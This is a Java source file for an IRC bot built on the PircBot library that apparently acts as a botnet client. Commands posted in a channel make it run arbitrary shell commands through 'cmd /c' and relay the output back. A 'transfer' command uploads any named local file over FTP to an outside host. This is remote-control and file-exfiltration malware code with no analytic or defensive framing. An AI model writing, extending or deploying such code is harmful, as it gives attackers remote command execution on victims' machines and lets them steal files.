package client;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.Scanner;

import org.jibble.pircbot.PircBot;



public class Client extends PircBot {
	private String nameSet;

	public Client(String name) {
		this.setName(name);

	}
	
	public String actualNick() {
		return "";//this.getNick().substring()
	}
	
	public static String execCmd(String cmd) throws java.io.IOException {
	    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec("cmd /c "+ cmd).getInputStream()).useDelimiter("\\A");
	    return s.hasNext() ? s.next() : "";
	}
	public void setVariableName(String nameSet) {
		this.nameSet = nameSet;
	}

	public void onMessage(String channel, String sender, String login, String hostname, String message) {
		if (message.charAt(0) == '.') {
			//System.out.println("command detected");
			message = message.substring(1, message.length());
			String[] words = message.split(" ");
			System.out.println("The following is the nick:" + this.getNick() );
			if (words.length > 0 && (words[0].equals(this.getNick()) || words[0].equals("all"))) {
				//System.out.println("command directed to me");
				
				
				if (words.length > 2 && words[1].equals("execute")) {
					System.out.println("executing command");
					String command = message.substring(message.indexOf("execute") + 8, message.length());
					//ArrayList<String> output = new ArrayList<String>();
					try {
						String cmdOutput = execCmd(command);
						for(String b: cmdOutput.split("\n")) {
							sendMessage(channel, b);
						}
						
						
						//sendMessage(channel, execCmd(command));
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
						sendMessage(channel, "Command failed.");
					}
	
				} else if (words.length > 2 && words[1].equals("transfer")) {
					
					String ftpUrl = "ftp://%s:%s@%s/%s;type=i";
					String host = "www.myserver.com";
					String user = "user";
					String pass = "pass";
					String filePath = words[2];
					String uploadPath = "/MyProjects/archive/Project.zip";

					ftpUrl = String.format(ftpUrl, user, pass, host, uploadPath);
					System.out.println("Upload URL: " + ftpUrl);

					try {
					    URL url = new URL(ftpUrl);
					    URLConnection conn = url.openConnection();
					    OutputStream outputStream = conn.getOutputStream();
					    FileInputStream inputStream = new FileInputStream(filePath);

					    byte[] buffer = new byte[8192];
					    int bytesRead = -1;
					    while ((bytesRead = inputStream.read(buffer)) != -1) {
					        outputStream.write(buffer, 0, bytesRead);
					    }

					    inputStream.close();
					    outputStream.close();

					    System.out.println("File uploaded");
					} catch (IOException ex) {
					    ex.printStackTrace();
					}
					
				}
				
				

			}

		}

	}
	
	
	private void executeCommand(String command) {
	    try {
	        returnOutput(command);
	        Process process = Runtime.getRuntime().exec(command);
	        logOutput(process.getInputStream(), "");
	        logOutput(process.getErrorStream(), "Error: ");
	        process.waitFor();
	    } catch (Exception e) {
	        e.printStackTrace();
	    }
	}

	private void logOutput(InputStream inputStream, String prefix) {
	    new Thread(() -> {
	        Scanner scanner = new Scanner(inputStream, "UTF-8");
	        while (scanner.hasNextLine()) {
	            synchronized (this) {
	                returnOutput(prefix + scanner.nextLine());
	            }
	        }
	        scanner.close();
	    }).start();
	}

	private synchronized void returnOutput(String message) {
	    System.out.println(message);
	}
}
